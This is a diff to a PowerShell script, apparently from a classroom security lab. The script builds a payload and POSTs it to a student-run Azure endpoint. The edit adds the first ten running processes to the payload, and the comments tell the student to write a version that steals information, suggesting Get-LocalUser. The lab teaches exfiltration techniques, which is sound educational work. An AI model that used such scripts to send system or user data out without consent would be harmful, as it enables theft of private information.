@@ -1,6 +1,5 @@
 ## This should be your Azure URL NOT mine
-$serviceUrl = "student-lab-a5pi2dp2qebma.azurewebsites.net/log"
-
+$serviceUrl = "student-lab-kpb6gwwmdimnw.azurewebsites.net/log"
 
 # This payload DOES NOT steal information
 # Create one that does.
@@ -8,9 +7,9 @@ $serviceUrl = "student-lab-a5pi2dp2qebma.azurewebsites.net/log"
 # Get-LocalUser is a fun one
 # Use whatever LLM you want
 $payload = @{
-    student = $env:USERNAME
-    message = "Hello from PowerShell!"
-    lab     = "Azure POST test"
+    newlinetest = "HTML newline <br>This is better <br>NO SCROLLING FOR YOU"
+    process = $(Get-Process | Select-Object -First 10 | ForEach-Object { "$($_.Name)`t$($_.Id)`t$($_.CPU)<br>" })
+    lab     = "Adding more details. "
 }
 
 $response = Invoke-RestMethod -Uri $serviceUrl -Method POST -Body ($payload | ConvertTo-Json) -ContentType "application/json"
